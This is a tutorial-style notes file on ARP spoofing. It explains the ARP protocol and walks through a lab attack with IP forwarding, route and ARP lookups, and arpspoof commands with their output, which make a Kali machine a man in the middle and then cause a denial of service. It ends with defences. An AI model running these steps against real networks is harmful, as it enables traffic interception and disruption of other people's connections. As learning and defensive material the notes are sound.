ARP spoofing
#BASICS

In computer networking, ARP spoofing (also ARP cache poisoning or ARP poison routing) is a technique 
by which an attacker sends (spoofed) Address Resolution Protocol (ARP) messages onto a local area 
network. Generally, the aim is to associate the attacker's MAC address with the IP address of 
another host, such as the default gateway, causing any traffic meant for that IP address to be sent 
to the attacker instead.

ARP spoofing may allow an attacker to intercept data frames on a network, modify the traffic, or stop 
all traffic. Often the attack is used as an opening for other attacks, such as denial of service, 
man in the middle, or session hijacking attacks.

The attack can only be used on networks that use ARP, and requires that the attacker has direct access 
to the local network segment to be attacked.

-> About ARP protocol

ARP protocol is used to transform IPv4 addresses to MAC Addresses.
ARP works with request/response format.
ARP is used on a LAN.

The request is broadcasted and could be summarize by: 
  Req:  who has <IP address>, tell <IP for response>
  Resp: <IP address> send its own MAC address to <IP for response>
  Then: <IP for response> stores the new couple MAC address/<IP address> in its ARP table.


-> How to perform ARP Spoofing.

0. Kali will be the MITM (Man In The Middle).

1. Enable the IP forwarding on the Kali machine.
$ sudo sh
# echo "1" > /proc/sys/net/ipv4/ip_forward
$ cat /proc/sys/net/ipv4/ip_forward
>>> The IP forwarding is now enabled on Kali.

2. Find the LAN gateway, the MAC Address and the interface on Kali.
$ route -n
---
Table de routage IP du noyau
Destination     Passerelle      Genmask         Indic Metric Ref    Use Iface
0.0.0.0         192.168.8.1     0.0.0.0         UG    100    0        0 eth0
---
>>> The gateway is 192.168.8.1 (<gw IP addr>).
>>> The interface is eth0.

$ ip addr
---
>>> The MAC addres of Kali is 08:00:27:6e:13:6e
---

3. Perform the attack.
* Check the ARP table on the target:
$ arp -a
---
console.gl-inet.com (192.168.8.1) at 94:83:c4:02:54:01 [ether] on eth0
---

* Performs the attack on Kali:
$ sudo arpspoof -i eth0 -t <target IP addr> -r <gw IP addr>
---
8:0:27:6e:13:6e 8:0:27:e4:e8:4c 0806 42: arp reply 192.168.8.1 is-at 8:0:27:6e:13:6e
8:0:27:6e:13:6e 94:83:c4:2:54:1 0806 42: arp reply 192.168.8.225 is-at 8:0:27:6e:13:6e
---
ARP spoofing. To 08:00:27:e4:e8:4c (the target): the MAC of 192.168.8.1 (the gw) is-at 08:00:27:6e:13:6e (kali)
ARP spoofing. To 94:83:c4:02:54:01 (the gw):     the MAC of 192.168.8.225 (the target) is-at 08:00:27:6e:13:6e (kali)
>>> Kali is the MITM.  All the traffic now pass through Kali.

* Check the result on the target:
$ arp -a
---
? (192.168.8.1) at 08:00:27:6e:13:6e [ether] on eth0
---
>>> The MAC addr of gw has changed for Kali's one.

4. Perform a DoS attack on Kali
$ sudo sh 
# echo "0" > /proc/sys/net/ipv4/ip_forward
>>> no ip forwarding anymore.
>>> The distance machine now suffers a DoS attack. No internet connection at all.

5. Stop the attack on Kali an restore ARP tables.
Ctrl-C in arpspoof to restore the initial ARP table.
>>> Ouf, attack ended ;) !

-> How to prevent yourself from ARP spoofing
  -Use tools like ARP-Watch (Linux) or X-ARP (Win) to detect suspicious activity.
  -Use Wireshark to view ARP spoofing and determine the machine.
  -Use Cisco router that limits number of ARP packets per second (15 p/s).
  -Use static association (arp -a).
    netsh on Windows gives the name of the network interface (example "Local Area Connection 2".
    netsh interface ip add neighbors "Local Area Connection 2" <ip> <mac>.
